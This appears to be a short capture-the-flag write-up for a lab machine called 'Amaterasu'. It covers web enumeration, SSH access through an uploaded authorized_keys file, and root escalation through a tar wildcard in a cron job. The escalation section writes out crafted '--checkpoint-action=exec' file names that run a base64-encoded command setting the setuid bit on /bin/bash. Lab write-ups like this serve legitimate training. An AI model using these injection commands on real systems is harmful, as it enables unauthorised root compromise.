# Amaterasu 🔹

## Enumeration

![](../assets/Pasted%20image%2020250302170008.png)

Feroxbustering port 33414 we find /info and /help

![](../assets/Pasted%20image%2020250302170533.png)

![](../assets/Pasted%20image%2020250302170547.png)

![](../assets/Pasted%20image%2020250302170629.png)

## Initial Access

The user alfredo has a .ssh folder and there is a ssh port open so we can try to upload an authorized_keys files with a public one inside.

![](../assets/Pasted%20image%2020250302190626.png)

```bash
cat id_rsa.pub > authorized_keys.txt
```

![](../assets/Pasted%20image%2020250302190722.png)

![](../assets/Pasted%20image%2020250302190748.png)

## Privilege Escalation

Get the flag

![](../assets/Pasted%20image%2020250302190820.png)

Transfer pspy to the machine and we see a task executing.

![](../assets/Pasted%20image%2020250302194944.png)

![](../assets/Pasted%20image%2020250302194957.png)

We don't have permissions to edit the script but we see that tar is using a wildcard, so we can exploit that.

```bash
echo -n 'chmod +s /bin/bash' | base64
> Y2htb2QgK3MgL2Jpbi9iYXNo
touch -- "--checkpoint=1"
touch -- '--checkpoint-action=exec="echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash"'
```

![](../assets/Pasted%20image%2020250302202933.png)

## Post Exploitation

![](../assets/Pasted%20image%2020250302203012.png)